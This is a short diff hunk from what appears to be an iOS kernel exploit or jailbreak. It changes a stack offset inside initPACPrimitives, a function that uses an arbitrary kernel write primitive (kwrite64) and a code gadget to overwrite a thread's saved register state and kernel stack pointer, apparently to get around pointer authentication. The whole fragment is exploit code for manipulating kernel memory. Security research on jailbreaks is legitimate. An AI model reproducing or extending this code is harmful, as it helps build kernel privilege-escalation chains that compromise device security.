@@ -273,7 +273,7 @@ uint64_t initPACPrimitives(uint64_t kernelAllocation)
 	kwrite64(actContext + offsetof(kRegisterState, x[17]), brX22);
 
 	// Use str x8, [x9] gadget to set TH_KSTACKPTR
-	kwrite64(actContext + offsetof(kRegisterState, x[8]), stack + 0x10ULL);
+	kwrite64(actContext + offsetof(kRegisterState, x[8]), stack + 0x1000ULL);
 	kwrite64(actContext + offsetof(kRegisterState, x[9]), threadPtr + bootInfo_getUInt64(@"TH_KSTACKPTR"));
 
 	// SP and x0 should both point to the new CPU state
